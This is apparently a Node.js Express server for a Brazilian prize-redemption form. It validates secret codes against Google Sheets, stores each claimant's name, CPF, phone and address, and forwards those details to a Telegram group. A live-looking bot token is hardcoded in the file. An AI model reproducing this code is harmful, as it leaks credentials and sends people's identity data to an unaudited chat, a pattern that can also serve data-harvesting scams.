import express from "express";
import cors from "cors";
import { google } from "googleapis";
import fetch from "node-fetch"; // For Telegram notification

const app = express();
app.use(cors());
app.use(express.json());

// 👉 AUTH 1: For validating secret codes
const creds1 = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT_1);
const spreadsheetId1 = process.env.SPREADSHEET_ID_1;

// 👉 AUTH 2: For saving order
const creds2 = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT_2);
const spreadsheetId2 = process.env.SPREADSHEET_ID_2;

// Telegram config
const TELEGRAM_BOT_TOKEN = "8443170386:AAHY0sjxFmRE5BbJp1FT1JtSwblwacW21II";
const TELEGRAM_CHAT_ID = "-1002411001864";

// 🧠 Create reusable sheet client
async function getSheetsClient(creds) {
  const auth = new google.auth.GoogleAuth({
    credentials: creds,
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  });
  const authClient = await auth.getClient();
  return google.sheets({ version: "v4", auth: authClient });
}

// ✅ TEST endpoint
app.get("/", (req, res) => {
  res.send("✅ BACKEND IS RUNNING!!");
});

// 🔍 Validate product_id + secret_code
app.get("/validate", async (req, res) => {
  const { product_id, secret_code } = req.query;

  if (!product_id || !secret_code) {
    return res.status(400).json({ status: "error", message: "Missing data" });
  }

  try {
    const sheets = await getSheetsClient(creds1);

    const response = await sheets.spreadsheets.values.get({
      spreadsheetId: spreadsheetId1,
      range: "secret_codes", // Ubah sesuai nama sheet-mu
    });

    const rows = response.data.values;
    if (!rows || rows.length === 0) {
      return res.json({ status: "error", message: "Sheet kosong" });
    }

    const found = rows.find(
      (row) => row[0] === product_id.trim() && row[1] === secret_code.trim()
    );

    if (found) {
      return res.json({ status: "valid", message: "Code valid" });
    } else {
      return res.json({ status: "invalid", message: "Code tidak ditemukan" });
    }
  } catch (err) {
    console.error("Error in /validate:", err);
    return res.status(500).json({ status: "error", message: "Server error" });
  }
});

// 📝 Save order to ORDER sheet, update code status in secret_codes, send Telegram
app.post("/order", async (req, res) => {
  const {
    productId,
    productName,
    productImg,
    fullName,
    cpf,
    phone,
    address,
    city,
    state,
    zip,
    secretCode
  } = req.body;

  if (
    !productId || !productName || !productImg || !fullName || !cpf ||
    !phone || !address || !city || !state || !zip || !secretCode
  ) {
    return res.status(400).json({ status: "error", message: "Missing fields" });
  }

  const brazilTime = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
  let sheets2, sheets1;
  try {
    // 1. Save to ORDER sheet
    sheets2 = await getSheetsClient(creds2);

    const values = [
      [
        brazilTime,    // A: Timestamp
        productId,    // B: productId
        productName,  // C: productName
        productImg,   // D: productImg
        fullName,     // E: fullName
        cpf,          // F: cpf
        phone,        // G: phone
        address,      // H: address
        city,         // I: city
        state,        // J: state
        zip,          // K: zip
        secretCode    // L: secretCode
      ]
    ];

    await sheets2.spreadsheets.values.append({
      spreadsheetId: spreadsheetId2,
      range: "ORDER!A2", // Pastikan Sheet namanya benar
      valueInputOption: "USER_ENTERED",
      resource: { values },
    });

    // 2. Update secret_codes status to USED and set Date Used in secret_codes sheet (sheet1)
    sheets1 = await getSheetsClient(creds1);
    const secretCodesSheet = "secret_codes";
    // Read all rows
    const resp = await sheets1.spreadsheets.values.get({
      spreadsheetId: spreadsheetId1,
      range: secretCodesSheet,
    });
    const rows = resp.data.values;
    // Find row index (skip header)
    const rowIdx = rows.findIndex(
      (row, idx) =>
        idx > 0 &&
        row[0] && row[1] &&
        row[0].trim() === productId.trim() &&
        row[1].trim() === secretCode.trim()
    );
    if (rowIdx === -1) {
      return res.status(400).json({ status: "error", message: "Secret code not found in secret_codes sheet" });
    }
    // Col C (Status), Col D (Date Used) = cols 3,4 (index 2,3)
    await sheets1.spreadsheets.values.update({
      spreadsheetId: spreadsheetId1,
      range: `${secretCodesSheet}!C${rowIdx+1}:D${rowIdx+1}`,
      valueInputOption: "USER_ENTERED",
      resource: { values: [["USED", brazilTime]] }
    });

    // 3. Send Telegram notification
    // Format message
    let msg = `🎁 NOVA SOLICITAÇÃO DE RESGATE 🎁\n\n`;
    msg += `👤 Nome: ${fullName}\n`;
    msg += `📇 CPF: ${cpf}\n`;
    msg += `📞 Telefone: ${phone}\n`;
    msg += `🏠 Endereço: ${address}\n`;
    msg += `🏙️ Cidade: ${city}\n`;
    msg += `📍 Estado: ${state}\n`;
    msg += `📬 CEP: ${zip}\n\n`;
    msg += `PRODUCT NAME : ${productName}\n`;
    msg += `PICTURE : ${productImg}\n`;
    msg += `🎁 ${productId}\n`;
    msg += `🔒 Código Secreto: ${secretCode}\n`;
    msg += `📅 Data: ${brazilTime}\n`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramRes = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "HTML"
      })
    });
    const telegramData = await telegramRes.json();
    if (!telegramData.ok) {
      throw new Error("Failed to send Telegram: " + JSON.stringify(telegramData));
    }

    // 4. Done: success response
    return res.json({ status: "success", message: "Order saved, code updated, Telegram sent" });

  } catch (err) {
    console.error("Error in /order:", err);
    return res.status(500).json({ status: "error", message: "Failed to process order", detail: (err && err.message) || err });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server ready on port ${PORT}`);
});
